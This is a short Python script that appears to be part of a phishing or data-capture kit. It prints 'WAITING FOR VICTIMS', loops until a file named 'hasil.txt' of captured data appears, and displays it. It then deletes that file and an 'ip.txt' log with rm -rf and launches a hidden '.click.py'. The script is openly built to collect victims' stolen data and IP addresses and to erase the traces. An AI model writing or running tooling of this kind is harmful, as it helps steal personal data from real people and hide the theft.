import os
print ("\n{\x1b[0;30;47m  WAITING FOR VICTIMS \x1b[0m}")
while True:
	a = os.path.isfile("hasil.txt")
	if a == True:
		print ("\n{\x1b[0;30;47m  DATA FOUND! \x1b[0m}")
		os.system("cat hasil.txt")
		break
os.system("rm -rf hasil.txt")
os.system("rm -rf ip.txt")
os.system("python2 .click.py")
